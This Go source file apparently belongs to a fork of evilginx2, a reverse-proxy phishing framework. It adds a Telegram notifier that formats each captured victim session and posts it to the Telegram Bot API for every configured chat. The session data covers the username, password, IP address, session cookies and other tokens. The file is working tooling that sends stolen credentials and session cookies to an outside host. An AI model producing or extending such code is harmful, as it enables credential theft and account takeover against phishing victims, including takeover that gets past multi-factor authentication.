package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// TelegramNotifier handles sending session notifications to Telegram
type TelegramNotifier struct {
	botToken string
	chatIDs []string
	client  *http.Client
}

// NewTelegramNotifier creates a new TelegramNotifier instance
func NewTelegramNotifier(botToken string, chatIDs []string) *TelegramNotifier {
	return &TelegramNotifier{
		botToken: botToken,
		chatIDs:  chatIDs,
		client: &http.Client{
			Timeout: 10 * time.Second,
		},
	}
}

// isConfigured checks if both bot token and chat ID are set
func (tn *TelegramNotifier) isConfigured() bool {
	return tn.botToken != "" && len(tn.chatIDs) > 0
}

// formatSessionMessage formats session data into a human-readable message
func (tn *TelegramNotifier) formatSessionMessage(session *database.Session) string {
	var msg bytes.Buffer
	
	msg.WriteString("🎣 Session Captured!\n\n")
	msg.WriteString(fmt.Sprintf("Session ID: %s\n", session.SessionId))
	msg.WriteString(fmt.Sprintf("Phishlet: %s\n", session.Phishlet))
	msg.WriteString(fmt.Sprintf("Username: %s\n", session.Username))
	msg.WriteString(fmt.Sprintf("Password: %s\n", session.Password))
	msg.WriteString(fmt.Sprintf("Remote Address: %s\n", session.RemoteAddr))
	
	// Format custom fields if present
	if len(session.Custom) > 0 {
		msg.WriteString("\nCustom Fields:\n")
		for key, value := range session.Custom {
			msg.WriteString(fmt.Sprintf("  %s: %s\n", key, value))
		}
	}
	
	// Format cookie tokens if present
	if len(session.CookieTokens) > 0 {
		msg.WriteString("\nCookie Tokens:\n")
		for domain, cookies := range session.CookieTokens {
			msg.WriteString(fmt.Sprintf("  %s:\n", domain))
			for _, cookie := range cookies {
				msg.WriteString(fmt.Sprintf("    - %s: %s\n", cookie.Name, cookie.Value))
			}
		}
	}
	
	// Format body tokens if present
	if len(session.BodyTokens) > 0 {
		msg.WriteString("\nBody Tokens:\n")
		for key, value := range session.BodyTokens {
			msg.WriteString(fmt.Sprintf("  %s: %s\n", key, value))
		}
	}
	
	// Format HTTP tokens if present
	if len(session.HttpTokens) > 0 {
		msg.WriteString("\nHTTP Tokens:\n")
		for key, value := range session.HttpTokens {
			msg.WriteString(fmt.Sprintf("  %s: %s\n", key, value))
		}
	}
	
	return msg.String()
}

// telegramMessage represents the Telegram API message payload
type telegramMessage struct {
	ChatID string `json:"chat_id"`
	Text   string `json:"text"`
}

// sendMessage sends a message to Telegram via the Bot API
func (tn *TelegramNotifier) sendMessage(text string) error {
	for _, chatID := range tn.chatIDs {
		apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", tn.botToken)

		payload := telegramMessage{
			ChatID: chatID,
			Text:  text,
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			return fmt.Errorf("failed to marshal telegram message: %v", err)
		}

		req, err := http.NewRequest("POST", apiURL, bytes.NewBuffer(jsonData))
		if err != nil {
			return fmt.Errorf("failed to create telegram request: %v", err)
		}

		req.Header.Set("Content-Type", "application/json")

		resp, err := tn.client.Do(req)
		if err != nil {
			return fmt.Errorf("failed to send telegram request: %v", err)
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			return fmt.Errorf("telegram API returned status %d", resp.StatusCode)
		}
	}

	return nil
}

// SendSessionNotification sends a session notification to Telegram
// This method includes panic recovery and comprehensive error handling
func (tn *TelegramNotifier) SendSessionNotification(session *database.Session) error {
	// Recover from any panics to prevent crashing the HTTP proxy
	defer func() {
		if r := recover(); r != nil {
			log.Error("telegram: panic recovered: %v", r)
		}
	}()
	
	// Skip if not configured
	if !tn.isConfigured() {
		log.Debug("telegram: skipping notification - not configured")
		return nil
	}
	
	// Format the session message
	message := tn.formatSessionMessage(session)
	
	// Send the message
	err := tn.sendMessage(message)
	if err != nil {
		log.Error("telegram: failed to send notification: %v", err)
		return nil // Don't propagate errors
	}
	
	log.Info("telegram: session notification sent successfully")
	return nil
}
